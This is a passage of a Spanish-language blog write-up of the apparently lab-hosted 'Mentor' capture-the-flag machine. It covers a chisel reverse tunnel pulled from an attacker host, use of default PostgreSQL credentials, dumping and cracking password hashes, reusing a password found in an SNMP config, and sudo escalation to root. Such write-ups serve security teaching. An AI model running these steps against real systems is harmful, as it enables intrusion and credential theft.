+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.80:8081 <span style="color:#f92672">(</span>10.10.14.80:8081<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>chisel               100% |********************************| 8452k  0:00:00 ETA
+</span></span></code></pre></div><p>Atacante</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>2024/08/02 00:03:21 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2024/08/02 00:03:21 server: Fingerprint XmJE32+0pB6QL7Qz0TxHillBb6Cs7f7sLF6uTMD4MnA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2024/08/02 00:03:21 server: Listening on http://0.0.0.0:1234
+</span></span><span style="display:flex;"><span>2024/08/02 00:04:07 server: session#1: tun: proxy#R:5432<span style="color:#f92672">=</span>&gt;172.22.0.1:5432: Listening
+</span></span></code></pre></div><p>Máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel client 10.10.14.80:1234 R:5432:172.22.0.1:5432
+</span></span><span style="display:flex;"><span>2024/08/01 20:04:27 client: Connecting to ws://10.10.14.80:1234
+</span></span><span style="display:flex;"><span>2024/08/01 20:04:27 client: Connected <span style="color:#f92672">(</span>Latency 37.887855ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahora en principio mi puerto local 5432 corresponde al puerto 5432 del equipo <code>172.22.0.1</code></p>
+<p>Lo podemos comprobar..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p5432 127.0.0.1
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-02 00:05 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00019s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>5432/tcp open  postgresql
+</span></span></code></pre></div><h2 id="enumerating-database">Enumerating Database</h2>
+<p>He utilizado <code>sshpass</code> para poner la contraseña de la base de datos rápidamente y así saltarme el prompt de la contraseña..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sshpass -p postgres psql -h 127.0.0.1 -U postgres -W postgres -p <span style="color:#ae81ff">5432</span>
+</span></span><span style="display:flex;"><span>psql <span style="color:#f92672">(</span>15.7 <span style="color:#f92672">(</span>Debian 15.7-0+deb12u1<span style="color:#f92672">)</span>, server 13.7 <span style="color:#f92672">(</span>Debian 13.7-1.pgdg110+1<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span> <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postgres<span style="color:#f92672">=</span><span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>con <code>\list</code> detectamos una base de datos llamada <code>mentorquotes_db</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>postgres<span style="color:#f92672">=</span><span style="color:#75715e"># \c mentorquotes_db</span>
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>psql <span style="color:#f92672">(</span>15.7 <span style="color:#f92672">(</span>Debian 15.7-0+deb12u1<span style="color:#f92672">)</span>, server 13.7 <span style="color:#f92672">(</span>Debian 13.7-1.pgdg110+1<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>You are now connected to database <span style="color:#e6db74">&#34;mentorquotes_db&#34;</span> as user <span style="color:#e6db74">&#34;postgres&#34;</span>.
+</span></span><span style="display:flex;"><span>mentorquotes_db<span style="color:#f92672">=</span><span style="color:#75715e"># \dt</span>
+</span></span><span style="display:flex;"><span>          List of relations
+</span></span><span style="display:flex;"><span> Schema |   Name   | Type  |  Owner
+</span></span><span style="display:flex;"><span>--------+----------+-------+----------
+</span></span><span style="display:flex;"><span> public | cmd_exec | table | postgres
+</span></span><span style="display:flex;"><span> public | quotes   | table | postgres
+</span></span><span style="display:flex;"><span> public | users    | table | postgres
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> rows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mentorquotes_db<span style="color:#f92672">=</span><span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>Vemos varias tablas interesantes, pero la que mas me interesa es <code>cmd_exec</code>  ya que podría haberse ejecutado comandos que revelen credenciales&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>mentorquotes_db<span style="color:#f92672">=#</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
+</span></span><span style="display:flex;"><span> id <span style="color:#f92672">|</span>         email          <span style="color:#f92672">|</span>  username   <span style="color:#f92672">|</span>             password
+</span></span><span style="display:flex;"><span><span style="color:#75715e">----+------------------------+-------------+----------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> james<span style="color:#f92672">@</span>mentorquotes.htb <span style="color:#f92672">|</span> james       <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>ccdcd8c05b59add9c198d492b36a503
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span> <span style="color:#f92672">|</span> svc<span style="color:#f92672">@</span>mentorquotes.htb   <span style="color:#f92672">|</span> service_acc <span style="color:#f92672">|</span> <span style="color:#ae81ff">53</span>f22d0dfa10dce7e29cd31f4f953fd8
+</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">2</span> <span style="color:#66d9ef">rows</span>)
+</span></span></code></pre></div><p>Estos hashes podremos intentar romperlos, aunque ya sabemos la contraseña para el usuario <code>james</code> ..</p>
+<p>Utilizando <a href="http://hashes.com">hashes.com</a> podemos ver que este hash ya había sido crackeado.
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Y ya podemos conectarnos con ssh y como el usuario <code>svc</code> con la credencial encontrada y ganamos acceso a la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh svc@10.129.255.245
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.129.255.245 (10.129.255.245)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.129.255.245<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">svc@10.129.255.245&#39;</span>s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.1 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-56-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Aug  <span style="color:#ae81ff">1</span> 08:12:26 PM UTC <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:                      0.0
+</span></span><span style="display:flex;"><span>  Usage of /:                       65.2% of 8.09GB
+</span></span><span style="display:flex;"><span>  Memory usage:                     14%
+</span></span><span style="display:flex;"><span>  Swap usage:                       0%
+</span></span><span style="display:flex;"><span>  Processes:                        <span style="color:#ae81ff">249</span>
+</span></span><span style="display:flex;"><span>  Users logged in:                  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-028c7a43f929: 172.20.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-24ddaa1f3b47: 172.19.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-3d63c18e314d: 172.21.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-7d5c72654da7: 172.22.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-a8a89c3bf6ff: 172.18.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> docker0:         172.17.0.1
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0:            10.129.255.245
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0:            dead:beef::250:56ff:fe94:6a7f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon Dec <span style="color:#ae81ff">12</span> 10:22:58 <span style="color:#ae81ff">2022</span> from 10.10.14.40
+</span></span><span style="display:flex;"><span>svc@mentor:~$
+</span></span></code></pre></div><h1 id="user-pivoting">User Pivoting</h1>
+<p>Ejecutando <code>linpeas.sh</code> encontramos lo siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>══════════╣ Analyzing SNMP Files <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3453</span> Jun  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2022</span> /etc/snmp/snmpd.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rocommunity: a SNMPv1/SNMPv2c read-only access community name</span>
+</span></span><span style="display:flex;"><span>rocommunity  public default -V systemonly
+</span></span><span style="display:flex;"><span>rocommunity6 public default -V systemonly
+</span></span><span style="display:flex;"><span>createUser bootstrap MD5 SuperSecurePassword123__ DES
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> Debian-snmp Debian-snmp <span style="color:#ae81ff">1268</span> Aug  <span style="color:#ae81ff">1</span> 19:55 /var/lib/snmp/snmpd.conf
+</span></span></code></pre></div><p>Y viendo los usuarios del sistema&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>svc@mentor:/tmp$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>svc:x:1001:1001:,,,:/home/svc:/bin/bash
+</span></span><span style="display:flex;"><span>james:x:1000:1000:,,,:/home/james:/bin/bash
+</span></span></code></pre></div><p><code>james:SuperSecurePassword123__</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>c@mentor:/tmp$ su james
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>james@mentor:/tmp$
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Ejecutando el comando <code>sudo -l</code></p>
+<p>Vemos que el usuario <code>james</code> puede ejecutar como el usuario que quiera, incluido <code>root</code>
+el comando binario <code>/bin/sh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james@mentor:/tmp$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> james:
+</span></span><span style="display:flex;"><span>Sorry, try again.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> james:
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> james on mentor:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User james may run the following commands on mentor:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /bin/sh
+</span></span></code></pre></div><p>Así que aquí ya está mascada la escalada de privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james@mentor:/tmp$ sudo /bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span>ef134ef73e65ef5c0...
+</span></span></code></pre></div><p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
